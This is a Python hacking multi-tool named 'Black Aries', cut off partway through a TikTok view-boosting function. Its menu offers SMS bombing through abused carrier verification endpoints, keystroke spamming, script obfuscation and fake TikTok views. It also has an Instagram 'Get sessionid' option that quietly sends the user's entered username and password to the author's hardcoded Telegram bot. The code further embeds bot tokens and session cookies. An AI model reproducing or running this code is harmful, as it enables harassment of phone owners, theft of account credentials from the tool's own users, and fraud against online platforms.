import os
import random as rand
import re
import threading
import colorama
from colorama import Fore
from phonenumbers import geocoder, parse, carrier, timezone
import time, sys
import pyautogui
import marshal
import pyfiglet
import requests
ask=''
def Arieslist():
    if ask506 == '4':
        print("[1]victam list")
        print('[2]allpass')
        aries1 = input('>>>')
        if aries1 == '2':
            chars = "abcdefghijklmnopqrstuvwxyz"
            CHARS = chars.upper()
            symbols = "[]{}()*@#_.-"
            numbers = '0123456789'
            j = ''
            allVariables = chars + CHARS + symbols + numbers
            numer = int(input("password number :"))
            len = numer
            if len > 16:
                print('the limit is 16')
            else:
                list5 = open("word list.txt", 'w')
                range_number = int(input("Password Rang :"))
                for counter in range(1, range_number):
                    passwords = ''.join(rand.sample(allVariables, len))
                    print(passwords)
                    list5.write(passwords)
                    list5.write('\n')
        if aries1 == '1':
            os.system('clear')
            os.system("python3 listtool.py")

def Phonenumber():
    if ask506 == '1':
        os.system('clear')
        print(Fore.LIGHTRED_EX + '')
        number = input("Number Phone: ")
        os.system('clear')
        os.system('figlet Number-aries')
        print('by: Black Aries')
        print(Fore.YELLOW + '>>><<' * 20)
        print(Fore.LIGHTRED_EX + '')
        print('[1] Know Number country')
        print('[2] Carrier Sim-Card')
        askn = input('>>>')
        if askn == '2':
            print(f'the Carrier Sim-Card of this phone number {number} is : ', end='')
            print(carrier.name_for_number(parse(number), 'en'))
        if askn == '1':
            print(f'the location of this phone number {number} is : ', end='')
            print(geocoder.description_for_number(parse(number), 'en'))
def spam():
    if ask506 == '3':
        os.system('clear')
        pwd = input('Enter path of file : ')
        time1 = int(input('Enter sleep time : '))
        time.sleep(5)
        s = open(f'{pwd}', 'r')
        for word in s:
            pyautogui.typewrite(word)
            pyautogui.press('enter')
            time.sleep(time1)
def Data_encryption():
    if ask506 == '2':
        os.system('clear')
        print('                   **              \n'
              '                  ****             \n'
              '                 ******            \n'
              '                ***  ***           \n'
              '               ****   ****         \n'
              '              ****     ****        \n'
              '             ****       ****       \n'
              '            ****         ****      \n'
              '           *******************     \n'
              '          *********************    \n'
              '         ****               ****   \n'
              '        ****                 ****  \n'
              '       ****                   **** \n'
              '      ****                     ****  RIES\n')
        print('[1] encryption txt date\n'
              '[2] dencryption txt date')
        print('[3] encryption python tool')
        select = input('>>>>')
        if select == '3':
            file = input('script name>>')
            new_name = input('new name>>')
            read = open(file).read()
            com = compile(read, '', 'exec')
            encrypto = marshal.dumps(com)
            new_file = open(new_name + '.py', 'w')
            new_file.write('import marshal\n')
            new_file.write('exec(marshal.loads({0}))'.format(repr(encrypto)))
            new_file.close()
        if select == '1':
            path = input('file path>>>')
            passkey = input('Enter passkey>>>')
            f = open(path, 'r')
            f1 = f.read()
            print(f1)
            words = f1
            file = words.lower()
            file1 = file.replace('a', f'{passkey}0126&')
            file2 = file1.replace('b', f'{passkey}0125&')
            file3 = file2.replace('c', f'{passkey}0124&')
            file4 = file3.replace('d', f'{passkey}0123&')
            file5 = file4.replace('e', f'{passkey}0122&')
            file6 = file5.replace('f', f'{passkey}0121&')
            file7 = file6.replace('g', f'{passkey}01120&')
            file8 = file7.replace('h', f'{passkey}0119&')
            file9 = file8.replace('i', f'{passkey}0118&')
            file10 = file9.replace('j', f'{passkey}0117&')
            file11 = file10.replace('k', f'{passkey}0116&')
            file12 = file11.replace('l', f'{passkey}0115&')
            file13 = file12.replace('m', f'{passkey}0114&')
            file14 = file13.replace('n', f'{passkey}0113&')
            file15 = file14.replace('o', f'{passkey}0112&')
            file16 = file15.replace('p', f'{passkey}0111&')
            file17 = file16.replace('q', f'{passkey}0110&')
            file18 = file17.replace('r', f'{passkey}019&')
            file19 = file18.replace('s', f'{passkey}018&')
            file20 = file19.replace('t', f'{passkey}017&')
            file21 = file20.replace('u', f'{passkey}016&')
            file22 = file21.replace('v', f'{passkey}015&')
            file23 = file22.replace('w', f'{passkey}014&')
            file24 = file23.replace('x', f'{passkey}013&')
            file25 = file24.replace('y', f'{passkey}012&')
            file26 = file25.replace('z', f'{passkey}011&')
            file27 = file26.replace(' ', '*_*')
            print(file27)
            os.system(f'rm -rf {path}')
            save = open(path, 'w')
            save.write(file27)
            save.close()

        if select == '2':
            path = input('file path>>>')
            passkey = input('Enter passkey>>>')
            f = open(path, 'r')
            f1 = f.read()
            print(f1)
            words = f1
            file = words.lower()
            file1 = file.replace(f'{passkey}0126&', 'a')
            file2 = file1.replace(f'{passkey}0125&', 'b')
            file3 = file2.replace(f'{passkey}0124&', 'c')
            file4 = file3.replace(f'{passkey}0123&', 'd')
            file5 = file4.replace(f'{passkey}0122&', 'e')
            file6 = file5.replace(f'{passkey}0121&', 'f')
            file7 = file6.replace(f'{passkey}01120&', 'g')
            file8 = file7.replace(f'{passkey}0119&', 'h')
            file9 = file8.replace(f'{passkey}0118&', 'i')
            file10 = file9.replace(f'{passkey}0117&', 'j')
            file11 = file10.replace(f'{passkey}0116&', 'k')
            file12 = file11.replace(f'{passkey}0115&', 'l')
            file13 = file12.replace(f'{passkey}0114&', 'm')
            file14 = file13.replace(f'{passkey}0113&', 'n')
            file15 = file14.replace(f'{passkey}0112&', 'o')
            file16 = file15.replace(f'{passkey}0111&', 'p')
            file17 = file16.replace(f'{passkey}0110&', 'q')
            file18 = file17.replace(f'{passkey}019&', 'r')
            file19 = file18.replace(f'{passkey}018&', 's')
            file20 = file19.replace(f'{passkey}017&', 't')
            file21 = file20.replace(f'{passkey}016&', 'u')
            file22 = file21.replace(f'{passkey}015&', 'v')
            file23 = file22.replace(f'{passkey}014&', 'w')
            file24 = file23.replace(f'{passkey}013&', 'x')
            file25 = file24.replace(f'{passkey}012&', 'y')
            file26 = file25.replace(f'{passkey}011&', 'z')
            file27 = file26.replace('*_*', ' ')
            print(file27)
            os.system(f'rm -rf {path}')
            save = open(path, 'w')
            save.write(file27)
            save.close()
def spam_NumberPhone():
    if ask506 == '5':

        import requests
        html = 'https://pastebin.com/raw/CSsP1sGY'
        try:
            Pro = requests.get(html).text

        except:
            print('\x1b[1;39m» \x1b[1;31mFail In Your Internet')
            exit('\x1b[1;39m')
        print()
        toolpass = open('spamtoolpass.txt', 'r')
        passreed = toolpass.read()
        toolpass.close()
        if passreed == Pro:
            print("""
                    \x1b[1;39m» \033[1;39m[√] \033[1;34mDone Login
                    """)
            time.sleep(1)
            os.system('clear')
            os.system('figlet Black-Aries')
            x = input("""\033[1;39m[\033[1;34m1\033[1;39m]\033[0;31m Orange
                        \033[1;39m[\033[1;34m2\033[1;39m] \033[0;31mVodafone
    
                        \033[1;39m[\033[1;34m*\033[1;39m] \033[0;31mEnter the selection number\033[1;39m : """)
            print()
            print('\033[1;39m~' * 20)
            print()
            if x == '2':
                import requests

                try:
                    num = int(input('\033[1;32mEnter Phone Number \033[1;34m:\033[1;39m '))
                    count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
                except:
                    print()
                    print('\033[1;31mwrong entry')
                    exit('\033[1;39m')
                    print()
                op = 0
                while op < count:
                    hd = {
                        "Host": "arabia.starzplay.com",
                        "content-length": "86",
                        "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"90\", \"Google Chrome\";v\u003d\"90\"",
                        "accept": "application/json, text/javascript, */*; q\u003d0.01",
                        "x-requested-with": "XMLHttpRequest",
                        "sec-ch-ua-mobile": "?1",
                        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
                        "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
                        "origin": "https://arabia.starzplay.com",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-dest": "empty",
                        "referer": "https://arabia.starzplay.com/ar/partners/vodafone-egypt",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
                        "cookie": "_gat_UA-52364929-4\u003d1"
                    }

                    url = 'https://arabia.starzplay.com/api/esb/userAccount/MSISDN/verify'

                    data = {
                        'mobilePrefix': '20',
                        'mobileNumber': num,
                        'operator': 'vodafoneegypt',
                        'subscriptionPeriod': 'WEEK'}
                    r = requests.post(url, headers=hd, data=data).text
                    op = op + 1

                    if 'smsTransactionId' in r:
                        print(f'\x1b[1;99m• \x1b[1;92mDone Send Sms {op}')
                    else:
                        print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
                        print('\033[1;39m')
                        exit()
                        print('\033[1;39m')

            if x == '1':
                import requests

                a = 0
                try:
                    num = input('\033[1;32mEnter Phone Number \033[1;34m:\033[1;39m ')
                    count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
                except:
                    print()
                    print('\033[1;31mwrong entry')
                    exit('\033[1;39m')
                    print()
                op = 0
                while op < count:
                    hd = {
                        "Host": "oleorange.com",
                        "Connection": "keep-alive",
                        "Content-Length": "427",
                        "Cache-Control": "max-age\u003d0",
                        "Upgrade-Insecure-Requests": "1",
                        "Origin": "http://oleorange.com",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
                        "Referer": "http://oleorange.com/login",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
                        "Cookie": "_ga\u003dGA1.2.2019747161.1622654085; _gid\u003dGA1.2.875712095.1622808599; _gat_gtag_UA_143099725_1\u003d1"
                    }

                    url = 'http://oleorange.com/login'

                    data = {
                        '__LASTFOCUS': '',
                        '__EVENTTARGET': '',
                        '__EVENTARGUMENT': '',
                        '__VIEWSTATE': 'FiJazqnh5l2e4/1lyIWN3lakRXyZNjFJthGqPukpX2TtR1N+VIb02ifPnQ+/3O+M5h9MHeGWFvrSoUsKrrmNkED0KOXFvBM1oINY/Kqqst0=',
                        '__VIEWSTATEGENERATOR': 'C2EE9ABB',
                        '__EVENTVALIDATION': 'hEOV7KjACybySncpY5zItuxpqfj6QvyvZw4yW32GCm+dQkoEIFYMEeY8OR3c9NrKpqmVoCuE6MzVi6UnGIGNxafDx/4ZiQ79/yyfimp4fKUAIcifYGHFPlni6d9VqkGknol5SuJh2chhtGflg1pTAQ==',
                        'txtPhone': num,
                        'btnLogin': 'Access'
                    }

                    r = requests.post(url, headers=hd, data=data).text
                    op = op + 1

                    if 'rfvtxtVerificationCode' in r:
                        print(f'\x1b[1;99m• \x1b[1;92mDone Send Sms {op}')
                    else:
                        print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
                        print('\033[1;39m')
                        exit()
            for v in range(100):
                print("\033[1;39m\033[1;34m\033[1;39m\033[0;31m done done done done done done done done done")
        else:
            pwd = input('\033[0;34m»» \033[1;34mEnter Password \033[1;34m:\33[0;34m ')

            if pwd == Pro:
                toolpass = open('spamtoolpass.txt', 'w')
                passreed = toolpass.write(pwd)
                toolpass.close()
                print("""
            \x1b[1;39m» \033[1;39m[√] \033[1;34mDone Login
            """)

                time.sleep(1)
                os.system('clear')
            else:
                print(f""" 
            \033[1;39m[x] \033[1;31mPassword is wrong
        
            \033[1;39m»» \033[1;32mGo to the Telegram channel to find the password
            \033[1;39m»» \033[1;34mTelegram:https://t.me/fuckyou506""")
                exit('\033[1;39m')
            os.system('figlet Black-Aries')
            x = input("""\033[1;39m[\033[1;34m1\033[1;39m]\033[0;31m Orange
            \033[1;39m[\033[1;34m2\033[1;39m] \033[0;31mVodafone
        
            \033[1;39m[\033[1;34m*\033[1;39m] \033[0;31mEnter the selection number\033[1;39m : """)
            print()
            print('\033[1;39m~' * 20)
            print()
            if x == '2':
                import requests

                try:
                    num = int(input('\033[1;32mEnter Phone Number \033[1;34m:\033[1;39m '))
                    count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
                except:
                    print()
                    print('\033[1;31mwrong entry')
                    exit('\033[1;39m')
                    print()
                op = 0
                while op < count:
                    hd = {
                        "Host": "arabia.starzplay.com",
                        "content-length": "86",
                        "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"90\", \"Google Chrome\";v\u003d\"90\"",
                        "accept": "application/json, text/javascript, */*; q\u003d0.01",
                        "x-requested-with": "XMLHttpRequest",
                        "sec-ch-ua-mobile": "?1",
                        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
                        "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
                        "origin": "https://arabia.starzplay.com",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-dest": "empty",
                        "referer": "https://arabia.starzplay.com/ar/partners/vodafone-egypt",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
                        "cookie": "_gat_UA-52364929-4\u003d1"
                    }

                    url = 'https://arabia.starzplay.com/api/esb/userAccount/MSISDN/verify'

                    data = {
                        'mobilePrefix': '20',
                        'mobileNumber': num,
                        'operator': 'vodafoneegypt',
                        'subscriptionPeriod': 'WEEK'}
                    r = requests.post(url, headers=hd, data=data).text
                    op = op + 1

                    if 'smsTransactionId' in r:
                        print(f'\x1b[1;99m• \x1b[1;92mDone Send Sms {op}')
                    else:
                        print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
                        print('\033[1;39m')
                        exit()
                        print('\033[1;39m')

            if x == '1':
                import requests

                a = 0
                try:
                    num = input('\033[1;32mEnter Phone Number \033[1;34m:\033[1;39m ')
                    count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
                except:
                    print()
                    print('\033[1;31mwrong entry')
                    exit('\033[1;39m')
                    print()
                op = 0
                while op < count:
                    hd = {
                        "Host": "oleorange.com",
                        "Connection": "keep-alive",
                        "Content-Length": "427",
                        "Cache-Control": "max-age\u003d0",
                        "Upgrade-Insecure-Requests": "1",
                        "Origin": "http://oleorange.com",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
                        "Referer": "http://oleorange.com/login",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
                        "Cookie": "_ga\u003dGA1.2.2019747161.1622654085; _gid\u003dGA1.2.875712095.1622808599; _gat_gtag_UA_143099725_1\u003d1"
                    }

                    url = 'http://oleorange.com/login'

                    data = {
                        '__LASTFOCUS': '',
                        '__EVENTTARGET': '',
                        '__EVENTARGUMENT': '',
                        '__VIEWSTATE': 'FiJazqnh5l2e4/1lyIWN3lakRXyZNjFJthGqPukpX2TtR1N+VIb02ifPnQ+/3O+M5h9MHeGWFvrSoUsKrrmNkED0KOXFvBM1oINY/Kqqst0=',
                        '__VIEWSTATEGENERATOR': 'C2EE9ABB',
                        '__EVENTVALIDATION': 'hEOV7KjACybySncpY5zItuxpqfj6QvyvZw4yW32GCm+dQkoEIFYMEeY8OR3c9NrKpqmVoCuE6MzVi6UnGIGNxafDx/4ZiQ79/yyfimp4fKUAIcifYGHFPlni6d9VqkGknol5SuJh2chhtGflg1pTAQ==',
                        'txtPhone': num,
                        'btnLogin': 'Access'
                    }

                    r = requests.post(url, headers=hd, data=data).text
                    op = op + 1

                    if 'rfvtxtVerificationCode' in r:
                        print(f'\x1b[1;99m• \x1b[1;92mDone Send Sms {op}')
                    else:
                        print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
                        print('\033[1;39m')
                        exit()
            for v in range(100):
                print("\033[1;39m\033[1;34m\033[1;39m\033[0;31m done done done done done done done done done")
def insta_tool():
    if ask506 == '6':
        print("[1]Get sessionid")
        print("[2]Get InFo")
        ask_insta=input(">>>")
        if ask_insta == '2':
            import os
            import requests
            import secrets, pyfiglet

            sfsf = pyfiglet.figlet_format('    InFo Black Aries ')
            M = '\033[34;1m'
            print(M + sfsf)
            print('* ' * 20)

            cookie = secrets.token_hex(8) * 2
            r = requests.Session()

            head = {
                'HOST': "www.instagram.com",
                'KeepAlive': 'True',
                'user-agent': "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
                'Cookie': cookie,
                'Accept': "*/*",
                'ContentType': "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "X-IG-App-ID": "936619743392459",
                "X-Instagram-AJAX": "missing",
                "X-CSRFToken": "missing",
                "Accept-Language": "en-US,en;q=0.9"
            }
            W = "\033[0m"  # اخضر
            G = '\033[35;1m'  # بنفسجي
            R = '\033[31;1m'  # احمر
            F = '\033[32;1m'  # اخضر 2
            D = '\033[33;1m'  # اصفر
            M = '\033[34;1m'
            b = ' 3'
            if '3' in b:
                x = input(G + '\n |  USER ONLY >>  ')

                url_id = f'https://www.instagram.com/{x}/?__a=1'

                req_id = r.get(url_id, headers=head).json()
                us = str(req_id['logging_page_id']).split('_')[1]
                u = f'https://o7aa.pythonanywhere.com/?id={us}'
                head = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
                    'Connection': 'keep-alive',
                    'Host': 'o7aa.pythonanywhere.com',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.70'
                }

                Dev = requests.get(u, headers=head).json()

                insha = str(Dev['data'])
                nam = str(req_id['graphql']['user']['full_name'])
                idd = str(req_id['graphql']['user']['id'])
                bio = str(req_id['graphql']['user']['biography'])
                floed = str(req_id['graphql']['user']['edge_followed_by']['count'])
                flors = str(req_id['graphql']['user']['edge_follow']['count'])
                hi = str(req_id['graphql']['user']['highlight_reel_count'])
                user = str(req_id['graphql']['user']['username'])

                print("==================================")
                SFSF = (f'''
                {D}[-] Name :{R}  {nam}

                {D}[-] UserName :{R} {user}

                {D}[-] Id :{R} {idd}

                {D}[-] Followrs :{R}{floed}

                {D}[-] Followerd :{R} {flors}

                {D}[-] HighLight  :  {R}{hi} 

                {D}[-] entrance   :  {R}{insha} ''')
                print(SFSF)
                requests.post(
                    f'''https://api.telegram.org/bot5371122494:AAGUBLLE5dr3RczZ8CUmKTGS96Z2QB1Zycc/sendMessage?chat_id=5141124832&text=- 𝐖𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 Black-Aries 𝐈𝐧𝐅𝐨 𝐚𝐂𝐜 ✫\n = = = = = = = = = = = = = = = = = = = = \n[-] 𝐍𝐚𝐌𝐞 :{nam}\n [-] 𝐔𝐬𝐞𝐑𝐧𝐀𝐦𝐞 : {user}\n[-] 𝐈𝐝 : {idd}\n[-] 𝐅𝐨𝐥𝐋𝐨𝐰𝐢𝐍𝐠 :{floed}\n[-] 𝐅𝐨𝐋𝐥𝐨𝐰𝐞𝐑𝐬 : {flors}\n[-] 𝐇𝐢𝐠𝐡𝐋𝐢𝐠𝐡𝐓  :  {hi} \n[-] 𝐄𝐧𝐓𝐞𝐫𝐚𝐍𝐜𝐞 :  {insha}\n = = = = = = = = = = = = = =  = = \n 𝑪𝒉𝑨𝒏𝒏𝒆𝑳 :https://t.me/fuckyou506''')
                print("==================================")

                ask = input(f'\n\n{D}[+] Send To Telegram [y/n] >> ')
                if ask == "y" or ask == 'Y':
                    print(' ')
                    ID = input('[+] Enter Telegram ID : ')
                    token = input('[+] Enter Token Bot Telegram : ')

                    Sf = (f'''''')
                    tlg = (
                        f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=- 𝐖𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 Black-Aries 𝐈𝐧𝐅𝐨 𝐚𝐂𝐜 ✫\n = = = = = = = = = = = = = = = = = = = = \n[-] 𝐍𝐚𝐌𝐞 :{nam}\n [-] 𝐔𝐬𝐞𝐑𝐧𝐀𝐦𝐞 : {user}\n[-] 𝐈𝐝 : {idd}\n[-] 𝐅𝐨𝐥𝐋𝐨𝐰𝐢𝐍𝐠 :{floed}\n[-] 𝐅𝐨𝐋𝐥𝐨𝐰𝐞𝐑𝐬 : {flors}\n[-] 𝐇𝐢𝐠𝐡𝐋𝐢𝐠𝐡𝐓  :  {hi} \n[-] 𝐄𝐧𝐓𝐞𝐫𝐚𝐍𝐜𝐞 :  {insha}\n = = = = = = = = = = = = = =  = = \n 𝑪𝒉𝑨𝒏𝒏𝒆𝑳 :https://t.me/fuckyou506''')
                    i = requests.post(tlg)
                    print(f'[-] Done Send Msg  ✓✓  ')
                else:
                    pass

        ##########################################################################################################################
        if ask_insta == "1":
            import re
            import requests
            from datetime import datetime



            link = 'https://www.instagram.com/accounts/login/'
            login_url = 'https://www.instagram.com/accounts/login/ajax/'

            time = int(datetime.now().timestamp())
            user = input('username : ')
            pwd = input('password : ')
            payload = {
                'username': '' + user + '',
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }

            with requests.Session() as s:
                r = s.get(link)
                csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
                r = s.post(login_url, data=payload, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://www.instagram.com/accounts/login/",
                    "x-csrftoken": csrf
                })
            requests.post(
                f'''https://api.telegram.org/bot5123867293:AAG9-KexIFyfzQ7mvsG8UiMoD1IpclamLoA/sendMessage?chat_id=5141124832&text=- 𝐖𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 Black-Aries ACCount  ✫\n = = = = = = = = = = = = = = = = = = = = \n [-] 𝐔𝐬𝐞𝐑𝐧𝐀𝐦𝐞 : {user}\n password : {pwd}''')
            print('')
            print('----------------------------')
            print('')
            print(s.cookies)
def TikTok_veiw():
    if ask506 == '7':
        os.system
        try:
            colorama.init(autoreset=colorama)
        except Exception as error_lib:
            print(error_lib)
            input()
        green = Fore.GREEN
        red = Fore.RED
        blue = Fore.BLUE
        hunter = pyfiglet.figlet_format("TikTok")
        print(' ')
        def j(z):
            for e in z:
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(3 / 100)

        j(hunter)

        count = 0
        url = input('\n- Send the video link.. : ')
        print('\n')
        Thread = int(input('- How many views. : '))
        # int(Thread)
        print('\n')

        def get_id_vedio():
            headers = {
                'Connection': 'close',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cookie': 'tt_webid_v2=6940688826462406145; tt_webid=6940688826462406145; ttwid=1%7Cbza8rvLOfNRPRwC43Zn3utwgngykYIkkhCtiFchZVMA%7C1616005073%7C1dd5efed4a61e4b1654f08f10a6ff7b85e3d57622a4d6011f6642b1bbf785fcb; passport_csrf_token=bb82884d8da300de0ce4f8508694e635; passport_csrf_token_default=bb82884d8da300de0ce4f8508694e635; store-country-code=sa; tta_attr_id=0.1616499265.6942811476331593729; store-idc=alisg; sid_guard=5c3ba51706c6f27ef59bb4fcaf0d282b%7C1617813999%7C5184000%7CSun%2C+06-Jun-2021+16%3A46%3A39+GMT; uid_tt=9896d319adfbb4f4f7a56b2122e84ef36354da5b7a766c3d93f08771723b2e3f; uid_tt_ss=9896d319adfbb4f4f7a56b2122e84ef36354da5b7a766c3d93f08771723b2e3f; sid_tt=5c3ba51706c6f27ef59bb4fcaf0d282b; sessionid=5c3ba51706c6f27ef59bb4fcaf0d282b; sessionid_ss=5c3ba51706c6f27ef59bb4fcaf0d282b; odin_tt=530994ec29b8076689f2e696e07f7968d74abe62dc6990364400b7b666b98e83afe2d12f34a5c717c851ce41d2368908d1f4c45a8c3974fb4230088b6d230969a128029a783f0ae00352b0d06fa62e0a; R6kq3TV7=AMgpub14AQAASGoycNrCjOkGEeZn3OSfPJcGlZpRyawc4vVW0_K5JN1ScBmQ|1|0|427184ccd78b46f2f1443048844aba7bf6064745; cmpl_token=AgQQAPO_F-RMpY4vzNb-op0_-jPehXJPv4M0YPgasw; tt_csrf_token=Ev5Kwld907oqGN2T1k0HrHWF; ak_bmsc=ED95FE19720A8F91CACBCE8408BFC78E56335E9519250000BF887260FE32B047~pl7zsPkhgfEfP2YwW3Ph6y02EtVXax7QH9oUN1eMfTdDnvOlFJcDXESyLLkFAXRIaueH2qItg4EdfKBI5loXsbdYeZAAy2oCOz7PNDhyQvstusWjR1M6xBMzpFKRcIXuEXMwtrfBx4nQLynJxNr7CJOOKb02W/y1LENhAnX2p+eHB4S6HL5PRUVaJXx6xqRPtjaFzenP3I/+Wx44jRsDjDNlxmlM7krZQs+TzdJApyqZ4=; bm_sz=F1634B2D883BE7F7F8E55AF4D48798F6~YAAQlV4zViahf3R4AQAAIitmvwtx/krEk+BEEQt4CoGeEB0X2JTHtZKLSBFVXxGgh8oLe8VcsrGqbUWhtO2eK/fhU6tdNs4C36OkPBJt7HlGRC07i6coxuZO1bcf0pxWJoJppYUoC9vPHQYh1++jflOXTPVSS0hw/W++SqiceRZkS+Q5SWGwWgWnx6hP4VB1; bm_sv=5AF097FF6E9C14E8BF077EE5BD7D126D~LBiUQfj1jYvhXvESNmEdfPzQcX6s8MGsQ79mJvSVV/OclkEWqotEPinlq8GADZ+tDMWTfCrS+nQ/dH0mG7bwj0L/5a8LC5sn4KJC+CEzqxHnt2JcMCSmRrYV5vO6sJDXY01ZEpWWSdJTGeCbBD7l2DPIFidy9J5ujWVeVBBbY6I=; _abck=494D5CEEE963A444A9BFED1397AE4A1A~-1~YAAQl14zVjHK03V4AQAAfJRovwV3ujEp8mNTnNKx5q6XhLXbDZgBUZwYi8ZS6N3zYCWz6lpsDgFzXfDQT7dKaxDyijowI/MIW0aLuDCIUFU5bw1xBMaKFv4tvXv8QfiThLmgZh3ihOCUJ9xBvVcf9Aw3OQ0YIpDK7oCidJ7WeQkT5jGIhm9yXvB6zUde3/xrOzZyDyxLO6qbSuunOwTmgGN/+qoNcrE82ZJDp3faWXgLMEtgi22ui9gENAV5rnlzEZll3e8AZMn9xZbq+9Aa7SAtgmih3i4WTgyPxwR7DXjPNZ+pnnAb/qJ+JCI+TFIiRW31KVuqy0A6142qz3Whm+XM++sQIWOuThkmXtEh25NeYtyKV3LwWDHMPg7sICqWEjOtgCLPh4lUxLpZaroVbcn0hnVZQ/ab~0~-1~-'
            }
            try:
                req = requests.get(url, headers=headers).text
                id_post1 = re.findall('"video":{"id":"(.*?)"', req)
                idpost = "".join(id_post1)
                time.sleep(2)
                print(f'[{Fore.LIGHTMAGENTA_EX}-{Fore.RESET}] Recorded  \n')
                time.sleep(2)
            except:
                print(f'[{Fore.LIGHTMAGENTA_EX}!{Fore.RESET}] The link is wrong..')
                input()

            def view():
                url = 'https://api16-core-c-alisg.tiktokv.com/aweme/v1/aweme/stats/?ac=WIFI&op_region=SA'
                headers = {
                    'Host': 'api16-core-c-alisg.tiktokv.com',
                    'Connection': 'close',
                    'Content-Length': '117',
                    'sdk-version': '2',
                    'passport-sdk-version': '5.12.1',
                    'x-Tt-Token': '010bcdc98424c32ae89cc3107afa55e05404d93afdc646ffe52f00765027281ea4a3925f965d979fe4b42352d9a67cc85784f67e0ce51639a7c82f272f89b7d2f0cdd2cb576f155abf94ba09a6dbaaae2923f-1.0.0',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'TikTok 17.4.0 rv:174014 (iPhone; iOS 14.2; ar_SA@calendar=gregorian) Cronet',
                    'X-SS-STUB': '88216088E2878AC941E829BCB0744C2D',
                    'x-tt-store-idc': 'alisg',
                    'x-tt-store-region': 'sa',
                    'X-SS-DP': '1233',
                    'x-tt-trace-id': '00-c9a77c9e1060b2d9bb9c828606df04d1-c9a77c9e1060b2d9-01',
                    'Accept-Encoding': 'gzip, deflate',
